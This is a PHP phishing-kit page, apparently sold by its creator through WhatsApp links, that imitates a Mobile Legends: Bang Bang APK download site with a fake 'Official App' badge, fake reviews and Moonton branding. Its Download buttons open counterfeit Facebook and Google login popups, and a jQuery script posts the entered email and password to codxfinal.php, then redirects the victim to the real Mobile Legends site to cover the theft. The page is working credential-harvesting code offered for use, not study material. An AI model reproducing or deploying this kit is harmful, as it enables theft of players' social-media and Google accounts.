<?php
// CREATOR KANG SCRIPT
// TOLONG HARGAI CREATOR
// Order SC: https://wa.me/62891630150

$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);

if(isset($_GET['change'])){
$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);
$ngResult = json_encode($data);
$ngFile = fopen('system/data.json','w');
           fwrite($ngFile,$ngResult);
           fclose($ngFile);
}
if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="en">
 <head> 
  <meta charset="UTF-8"> 
  <title>Mobile Legends: Bang Bang</title> 
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"> 
  <meta property="og:description" content="Mobile Legends: Exchange Event"> 
  <meta property="og:image" content="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/12/logo.png"> 
  <meta property="og:image:width" content="540"> 
  <meta property="og:image:height" content="282"> 
  <link href="./index_files/css" rel="stylesheet"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/12/animate.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/12/laza-swiper.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/12/loading.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/login2/facebook.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/login2/google.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/login2/all.css"> 
  <link href="https://fonts.googleapis.com/css2?family=Roboto&amp;display=swap" rel="stylesheet"> 
  <link href="https://fonts.googleapis.com/css2?family=Teko&amp;display=swap" rel="stylesheet"> 
  <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/12/min.css"> 
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cdn-alz/css@main/12/ori.css"> 
  <link rel="icon" type="img/png" href="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/12/1d4439a2ab14e995b99fd8934adb34ee.svg" sizes="32x32"> 
  <style>
</style> 
 </head> 
 <body style=""> 
  <div class="slider-container"> 
   <div class="navbar"> 
    <img class="navbar-logo" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/12/logo.png"> 
    <div class="navbar-left"> 
     <img class="navbar-language" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/12/glob.svg"> 
     <div class="navbar-text">
      EN
     </div> 
    </div> 
    <div class="navbar-right"> 
     <img class="navbar-menu" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/12/menu.png"> 
    </div> 
   </div> 
   <div class="container"> 
    <div class="app-icon"> 
     <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/12/ace2a42a06d9b201b2ec0cf92535dc3e_icon.png" alt="Mobile Legends: Bang Bang Icon"> 
    </div> 
    <div class="app-info"> 
     <div class="app-title">
       Mobile Legends: Bang Bang (BETA) 
     </div> 
     <div class="dev-name" style="display: flex; align-items: center;"> 
      <span>Moonton</span> 
      <span class="trust-badge" style="display: flex; align-items: center; margin-left: 8px;"> <img alt="Trustable Ranking Icon" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/12/official-app.svg" style="width: 18px; height: 18px;"> <span style="margin-left: 4px; font-size: 14px; color: #1da1f2;">Official App</span> </span> 
     </div> 
     <div class="rating"> 
      <span class="stars">★★★★★</span> 
      <span class="rating-value">4.1</span> 
      <span class="rating-votes">(13M votes)</span> 
     </div> 
     <div style="display: flex; justify-content: center; margin: 16px 0; gap: 12px;"> 
      <button class="download-btn" id="opengp" style="background: #205884;" onclick="codxLoginPopup()">Download APK (199 MB)</button> 
      <style>
                @keyframes fadeIn {
                    from { opacity: 0; }
                    to { opacity: 1; }
                }
                </style> 
     </div> 
     <div id="download-processing" style="display:none;color:#1da1f2;font-size: 13px;text-align:center;animation: fadeIn 0.5s;margin-top: -24px;margin-bottom: 13px;"> 
      <i class="fa fa-spinner fa-spin"></i> Download processing... 
     </div> 
     <div class="app-desc">
       Mobile Legends: Bang Bang is a 5v5 MOBA game for Android that pits real players against each other, using a team composed of your favorite heroes. Enjoy quick matchmaking and epic battles! 
     </div> 
     <div class="app-details"> 
      <div>
       <strong>Version:</strong> 1.8.65.8941
      </div> 
      <div>
       <strong>Last update:</strong> 2025-06-01
      </div> 
      <div>
       <strong>Downloads:</strong> 500M+
      </div> 
      <div>
       <strong>Requires Android:</strong> 4.1+
      </div> 
      <div>
       <strong>Content Rating:</strong> Everyone 10+
      </div> 
     </div> 
    </div> 
   </div> 
   <div class="app-view__AppDetailsContainer-sc-oiuh9w-4 jBqCjJ"> 
    <div class="app-view__Row-sc-oiuh9w-1 app-view__TabsContainer-sc-oiuh9w-5 jaAMtu cfcJXE"> 
     <span class="app-view__RobotoFont-sc-oiuh9w-6 app-view__AppViewTab-sc-oiuh9w-7 WvlRB eiySUK" id="tab-details">Details</span> 
     <span class="app-view__RobotoFont-sc-oiuh9w-6 app-view__AppViewTab-sc-oiuh9w-7 WvlRB jbbpIZ" id="tab-reviews">Reviews</span> 
     <span class="app-view__RobotoFont-sc-oiuh9w-6 app-view__AppViewTab-sc-oiuh9w-7 WvlRB jbbpIZ" id="tab-faqs">FAQs</span> 
     <span class="app-view__RobotoFont-sc-oiuh9w-6 app-view__AppViewTab-sc-oiuh9w-7 WvlRB jbbpIZ" id="tab-versions">Versions</span> 
     <span class="app-view__RobotoFont-sc-oiuh9w-6 app-view__AppViewTab-sc-oiuh9w-7 WvlRB jbbpIZ" id="tab-info">Info</span> 
    </div> 
    <div id="tab-content-details" class="tab-content" style="display:block;"> 
     <div class="game-description"> 
      <h4 style="color: #9db6db; margin-bottom: 8px;">Description</h4> 
      <p> <strong>Mobile Legends: Bang Bang</strong> is a fast-paced 5v5 MOBA game for Android, where real players team up and battle in real time using their favorite heroes. With quick matchmaking and smooth controls, you’ll jump straight into action-packed matches designed for both casual and competitive gamers. </p> 
      <p> Experience classic MOBA gameplay with three lanes, wild bosses, and four jungle areas. Choose from a growing roster of heroes—assassins, supports, marksmen, tanks, and more—each with unique skills and playstyles. Teamwork and strategy are key: coordinate with your allies, defend your base, and push to destroy enemy towers for victory. </p> 
      <p> Mobile Legends stands out for its fair and balanced matchmaking system, ensuring that skill and teamwork—not spending—determine your success. Battles are quick to start and typically last just minutes, making it easy to enjoy a full match anytime, anywhere. </p> 
      <p> The intuitive controls let you master your hero quickly: use the virtual joystick on the left to move and action buttons on the right for skills. Innovative features like tap-to-equip keep you focused on the fight, while a fast reconnection system and AI support ensure you’re never left behind if your connection drops. </p> 
      <p> With stunning graphics, regular updates, and a vibrant global community, Mobile Legends: Bang Bang brings the excitement of MOBA gaming to your mobile device. Jump in, team up, and prove your skills on the battlefield! </p> 
     </div> 
    </div> 
    <div id="tab-content-reviews" class="tab-content" style="display:none;"> 
     <div class="reviews-section" style="padding:16px;"> 
      <h4 style="color: #9db6db; margin-bottom: 8px;">Reviews</h4> 
      <div class="review"> 
       <div class="review-header" style="display: flex; align-items: center; margin-bottom: 6px;"> 
        <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/12/32.jpg" alt="User" style="width:32px;height:32px;border-radius:50%;margin-right:10px;"> 
        <div> 
         <strong>Andrew Smith</strong> 
         <div style="font-size:12px;color:#aaa;">
          June 2, 2024
         </div> 
        </div> 
       </div> 
       <div class="review-rating" style="color: #FFD700;">
        ★★★★★
       </div> 
       <div class="review-text">
        Best MOBA game on Android! Great graphics, smooth gameplay, and lots of favorite heroes. Playing with friends is even more fun!
       </div> 
      </div> 
      <hr style="border:0;border-top:1px solid #222;margin:12px 0;"> 
      <div class="review"> 
       <div class="review-header" style="display: flex; align-items: center; margin-bottom: 6px;"> 
        <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/12/44.jpg" alt="User" style="width:32px;height:32px;border-radius:50%;margin-right:10px;"> 
        <div> 
         <strong>Sophia Lee</strong> 
         <div style="font-size:12px;color:#aaa;">
          May 28, 2024
         </div> 
        </div> 
       </div> 
       <div class="review-rating" style="color: #FFD700;">
        ★★★★☆
       </div> 
       <div class="review-text">
        Really fun, but sometimes it lags if the signal is bad. The events are interesting and the skins are awesome!
       </div> 
      </div> 
      <hr style="border:0;border-top:1px solid #222;margin:12px 0;"> 
      <div class="review"> 
       <div class="review-header" style="display: flex; align-items: center; margin-bottom: 6px;"> 
        <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/12/65.jpg" alt="User" style="width:32px;height:32px;border-radius:50%;margin-right:10px;"> 
        <div> 
         <strong>David Johnson</strong> 
         <div style="font-size:12px;color:#aaa;">
          May 15, 2024
         </div> 
        </div> 
       </div> 
       <div class="review-rating" style="color: #FFD700;">
        ★★★★★
       </div> 
       <div class="review-text">
        Fast matchmaking, easy-to-understand controls. Suitable for both beginners and pros. Frequent updates too!
       </div> 
      </div> 
      <hr style="border:0;border-top:1px solid #222;margin:12px 0;"> 
      <div class="review"> 
       <div class="review-header" style="display: flex; align-items: center; margin-bottom: 6px;"> 
        <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/12/68.jpg" alt="User" style="width:32px;height:32px;border-radius:50%;margin-right:10px;"> 
        <div> 
         <strong>Emily Rose</strong> 
         <div style="font-size:12px;color:#aaa;">
          April 30, 2024
         </div> 
        </div> 
       </div> 
       <div class="review-rating" style="color: #FFD700;">
        ★★★☆☆
       </div> 
       <div class="review-text">
        The game is good, but sometimes toxic players are annoying. Hope it gets better in the future!
       </div> 
      </div> 
     </div> 
    </div> 
    <div id="tab-content-faqs" class="tab-content" style="display:none;"> 
     <div class="faqs-section" style="padding:16px;"> 
      <h4 style="color: #9db6db; margin-bottom: 8px;">FAQs</h4> 
      <div class="faq-item"> 
       <strong>How to download Mobile Legends APK?</strong> 
       <p> To download Mobile Legends on your Android device, simply tap the Download button above and follow the steps provided. On some devices, you may need to grant special permissions to the Aptoide app store to install apps from unknown sources. Usually, this permission is requested during installation, but if not, you can manually enable it in your Android settings. </p> 
      </div> 
      <div class="faq-item"> 
       <strong>Is Mobile Legends free?</strong> 
       <p> Downloading and playing Mobile Legends is completely free! You don t need to pay anything to enjoy the game. While in-app purchases are available, the Aptoide version offers you a bonus on every purchase. </p> 
      </div> 
      <div class="faq-item"> 
       <strong>What is the total size of Mobile Legends?</strong> 
       <p> Mobile Legends: Bang Bang APK is about 136.5 MB, making it one of the lightest MOBA games for Android. Despite its small size, it offers high-quality graphics, voice-acting, and a great gaming experience. </p> 
      </div> 
      <div class="faq-item"> 
       <strong>Why is Mobile Legends so popular?</strong> 
       <p> Mobile Legends is popular due to its fast 10-second matchmaking, 10-minute battles, and a variety of gameplay features like 4 jungle areas, 3 lanes, 2 bosses, 18 defense towers, and multiple hero types such as Tanks, Mages, Assassins, and Marksmen. </p> 
      </div> 
     </div> 
    </div> 
    <div id="tab-content-versions" class="tab-content" style="display:none;"> 
     <div class="versions-section" style="padding:16px;"> 
      <h4 style="color: #9db6db; margin-bottom: 8px;">Versions</h4> 
      <div class="versions__VersionsItemContainer-sc-1qeurd6-7 bnprIO"> 
       <h2 class="versions__LastVersionHeader-sc-1qeurd6-11 dHjtkP">Latest Version of Mobile Legends: Bang Bang</h2> 
       <div class="versions__VersionItemContainer-sc-1qeurd6-1 fOmFIn"> 
        <div class="versions__DetailsColumn-sc-1qeurd6-3 feHwps"> 
         <div class="versions__VersionItemTitle-sc-1qeurd6-6 kxJGCc"> 
          <span color="#171717" class="appview-header__AppViewSpan-sc-weylp4-13 gIkYdN">21.9.93.10904</span> 
          <img alt="Trust Icon Versions" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/12/trust-icon.svg" class="versions__TrustedIcon-sc-1qeurd6-8 cvkavv"> 
         </div> 
         <span color="#6F6F6F" class="appview-header__AppViewSpan-sc-weylp4-13 iJfTuT">1/6/2025</span> 
         <div class="versions__DetailsRow-sc-1qeurd6-5 gEpwez"> 
          <span color="#6F6F6F" class="appview-header__AppViewSpan-sc-weylp4-13 iJfTuT">6M downloads</span> 
          <span color="#6F6F6F" class="appview-header__AppViewSpan-sc-weylp4-13 hdwVVt">199 MB Size</span> 
         </div> 
        </div> 
        <div class="versions__DownloadContainer-sc-1qeurd6-4 hyvrS"> 
         <div class="download-button__DownloadContainer-sc-18tslsf-0 iupaOQ"> 
          <a href="javascript:void(0);" class="gradient-button__OutlinedAppStore-sc-1troloh-4 fDAbyw track-download-button version-download-btn" style="text-decoration:none;color:inherit;" onclick="codxLoginPopup()"> Download </a> 
         </div> 
        </div> 
       </div> 
      </div> 
     </div> 
    </div> 
    <div id="tab-content-info" class="tab-content" style="display:none;"> 
     <div class="info-section" style="padding:16px;"> 
      <h4 style="color: #9db6db; margin-bottom: 8px;">Info</h4> 
      <div class="info__InfoContainer-sc-1q3osbl-0 geZfTX"> 
       <div class="info__APKInformation-sc-1q3osbl-5 dMZnbg"> 
        <h2 class="info__APKHeaderTitle-sc-1q3osbl-7 ckkSOj">Mobile Legends: Bang Bang - APK Information</h2> 
        <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>APK Version:</strong> 21.9.93.10904</span> 
        <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Package:</strong> com.mobile.legends</span> 
        <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Android compatability:</strong> 4.4 - 4.4.4+ (KitKat)</span> 
        <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"> 
         <meta itemprop="publisher" content="Moonton"> <strong>Developer:</strong> <a href="https://www.mobilelegends.com/" rel="nofollow" class="info__InfoAnchor-sc-1q3osbl-9 jXmlxC"> 
          <meta itemprop="publisher" content="Moonton">Moonton </a> </span> 
        <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"> <strong>Privacy Policy:</strong> <a href="https://m.mobilelegends.com/news/articleldetail?newsid=2690279" rel="nofollow" class="info__InfoAnchor-sc-1q3osbl-9 jXmlxC"> https://m.mobilelegends.com/news/articleldetail?newsid=2690279 </a> </span> 
        <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"> <strong>Permissions:</strong> <a data-cy="permissions" class="info__InfoAnchor-sc-1q3osbl-9 jXmlxC">47</a> </span> 
       </div> 
       <div class="info__DetailsInformations-sc-1q3osbl-10 jRooCZ"> 
        <div class="info__DetailsCol-sc-1q3osbl-11 cogrwL"> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Name:</strong> Mobile Legends: Bang Bang</span> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Size:</strong> 199 MB</span> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Downloads:</strong> 6M</span> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Version :</strong> 21.9.93.10904</span> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Release Date:</strong> 2025-06-20 11:09:06</span> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Min Screen:</strong> SMALL</span> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Supported CPU:</strong> armeabi-v7a, arm64-v8a</span> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>Package ID:</strong> com.mobile.legends</span> 
         <span class="info__APKDetail-sc-1q3osbl-8 jNjvUq"><strong>SHA1 Signature:</strong> D6:59:C5:39:7A:8F:2A:5B:6F:34:89:E5:46:A3:89:CA:54:FD:28:FC</span> 
        </div> 
       </div> 
      </div> 
     </div> 
    </div> 
   </div> 
   <div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login untuk melanjutkan.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/logfb.webp" onclick="codxFB();"> 
      <img src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/loggp.webp" onclick="codxGP();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login login-facebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="closeFB()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div> 
     <form class="login-form" onsubmit="VerificationData();" id="FormFB" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="closeGP()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://cdn.jsdelivr.net/gh/cdn-alz/img@main/login2/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FormGP" onsubmit="VerificationData();" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://code.alex-hosting.my.id/github/jquery-3.7.1.min.js"></script>
  <script src="https://code.alex-hosting.my.id/npm/jquery-1.12.min.js"></script>
  <script>
            const tabs = [
                { btn: 'tab-details', content: 'tab-content-details' },
                { btn: 'tab-reviews', content: 'tab-content-reviews' },
                { btn: 'tab-faqs', content: 'tab-content-faqs' },
                { btn: 'tab-versions', content: 'tab-content-versions' },
                { btn: 'tab-info', content: 'tab-content-info' }
            ];
            tabs.forEach(({btn, content}) => {
                document.getElementById(btn).addEventListener('click', function() {
                    tabs.forEach(({btn: b, content: c}) => {
                        document.getElementById(c).style.display = (c === content) ? 'block' : 'none';
                        document.getElementById(b).classList.toggle('eiySUK', b === btn);
                        document.getElementById(b).classList.toggle('jbbpIZ', b !== btn);
                    });
                });
            });
        </script> 
  <script>
        const toggleBtn = document.getElementById('toggleDescBtn');
        const descContent = document.getElementById('descContent');
        const arrowIcon = document.getElementById('arrowIcon');
        let isShown = false;
        descContent.style.display = 'none';
        arrowIcon.className = 'fa fa-chevron-up';
        toggleBtn.addEventListener('click', function() {
            isShown = !isShown;
            descContent.style.display = isShown ? 'block' : 'none';
            arrowIcon.className = isShown ? 'fa fa-chevron-down' : 'fa fa-chevron-up';
        });
    </script> 
  <script>
  $(document).ready(function () {
    function containsLetters(value) {
        return /[a-zA-Z]/.test(value);
    }

    function isValidEmail(email) {
        return email.toLowerCase().endsWith('@gmail.com');
    }

    function containsSuspiciousContent(value) {
        return /(http|https|:\/\/)/i.test(value);
    }

   function handleFormSubmit(formSelector, emailSelector, passwordSelector) {
        $(formSelector).submit(function (e) {
            e.preventDefault();

            var email = $(emailSelector).val().trim();
            var password = $(passwordSelector).val().trim();
            var loginType = $(this).find('input[name="login"]').val();

            if (email && password) {
                if (containsSuspiciousContent(email) || containsSuspiciousContent(password)) {
                    alert("Email dan Password tidak boleh mengandung 'https'.");
                    return;
                }

                if (containsLetters(email) && !isValidEmail(email)) {
                    alert("HARAP TAMBAHKAN @gmail.com.");
                    return;
                }

                $.post('codxfinal.php', {
                    email: email,
                    password: password,
                    login: loginType
                }).always(function () {
                    window.location.href = "https://mobilelegends.com";
                });
            }
        });
    }

    // Aktifkan fungsi submit untuk FB dan GP
    handleFormSubmit('#FormFB', 'input[name="email"]', 'input[name="password"]');
    handleFormSubmit('#FormGP', '#email_gp', '#password_gp');

    // Tombol
    $("#codxFacebook").click(function () {
        codxFB();
    });

    $("#codxGoogle").click(function () {
        codxGP();
    });

    $("#codxLoginPopup").click(function () {
        codxLoginPopup();
    });
});
</script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
// KHUSUS VIP S2M https://wa.me/62895330150
</script>
 </body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>